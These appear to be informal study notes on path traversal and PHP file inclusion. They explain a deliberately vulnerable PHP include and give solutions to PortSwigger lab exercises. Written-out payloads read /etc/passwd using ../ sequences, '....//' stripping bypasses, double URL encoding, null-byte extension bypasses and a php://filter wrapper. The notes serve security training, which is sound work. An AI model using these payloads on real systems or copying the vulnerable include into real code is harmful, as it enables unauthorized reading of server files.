Ok he started wit an example showing a php file that he creates, and cointaining this


So when you do this he creates a variable called "filename" and it makes petitions to something called 'filename'

The echo is forcing to the path called "example/dir"  to the destiny of the query 
The "."  concatenates the path with the variable called filename
```
<?php 
   $filename= $_GET['filename'];
   echo include("example/dir/" .           $filename);
?>
```

So he creates a dir called example inside another called "dir" and inside three files html

example>dir>1.hml,2.html,3.html

and he made a php server with this command

php -S 0.0.0.0:80


Now on the http://localhost he searches the files with the next way 
http://localhost/?filename=2.html
http://localhost/?filename=1.html
http://localhost/?filename=3.html


so if you put something that isnt exist like
http://localhost/?filename=fweiojfiowe
nothing happens


So, if you put the variable ../../../../../../../../../../etc/passwd it will retrocede to the root folder.

Some sanitizations are applied on the code like

```
php --interactive
php>echo str_replace("../","")
```
The code;

```
<?php 
   $filename= $_GET['filename'];
   $newfilename = str_replace("../","",$filename);
   include("example/dir/" . $newfilename);
?>
```

Buy you can pass this with 
"....//....//....//....//....//etc/passwd"

Now , lets go to the exercises

#  File path traversal, simple case #

 This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

Solution:

Left click on the image and make this query

```
https://0a53006e030530ec836e612a005a008b.web-security-academy.net/image?filename=../../../../../../../../../../../etc/passwd
```
Better if you intercept the petition and modify the "GET" petition

# Lab: File [path traversal](https://portswigger.net/web-security/file-path-traversal), traversal sequences blocked with absolute path bypass #

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application blocks traversal sequences but treats the supplied filename as being relative to a default working directory.

To solve the lab, retrieve the contents of the `/etc/passwd` file.


So on this case we must specify the "absolute path" it is not necessary to put ../../../  putting just /etc/passwd it's enough


```
GET /image?filename=/etc/passwd HTTP/2
```

# WRAPPER EXPLANATION #

localhost/?filename=php://filter/convert.base64-encode/resource=cmd.php

this interprets the cmd.php file and gives us the result on the screen


# Lab: File [path traversal](https://portswigger.net/web-security/file-path-traversal), traversal sequences stripped non-recursively#

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application strips path traversal sequences from the user-supplied filename before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.


you try ../../../../../ 

and .. 
"no such file"

/etc/passwd

"no such file"

sometimes works this wrapper

file://etc/passwd

"no such file"

we can try this:

....//....//....//....//....//....//....//....//

and we have the etc passwd

```
GET /image?filename=....//....//....//....//....//....//....//....//etc/passwd
```

# File [path traversal](https://portswigger.net/web-security/file-path-traversal), traversal sequences stripped with superfluous URL-decode#

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application blocks input containing path traversal sequences. It then performs a URL-decode of the input before using it.

To solve the lab, retrieve the contents of the `/etc/passwd` file.


This way us double url encoding.. first the / and then the % resulting of the url encoding

```
GET /image?filename=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc/passwd HTTP/2
```

# File [path traversal](https://portswigger.net/web-security/file-path-traversal), validation of start of path#

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application transmits the full file path via a request parameter, and validates that the supplied path starts with the expected folder.

To solve the lab, retrieve the contents of the `/etc/passwd` file.


The solution: you must put the pat traversal after /var/www/images/
```
/image?filename=/var/www/images/../../../etc/passwd
```


# File [path traversal](https://portswigger.net/web-security/file-path-traversal), validation of file extension with null byte bypass#

This lab contains a [file path traversal](https://portswigger.net/web-security/file-path-traversal) vulnerability in the display of product images.

The application validates that the supplied filename ends with the expected file extension.

To solve the lab, retrieve the contents of the `/etc/passwd` file.

SO this one needs that the extension be on the end, In this case .jpg

To solve this we insert a null byte on the end

```
/image?filename=../../../../../../../../../../../../../../../../../../etc/passwd%00.jpg
```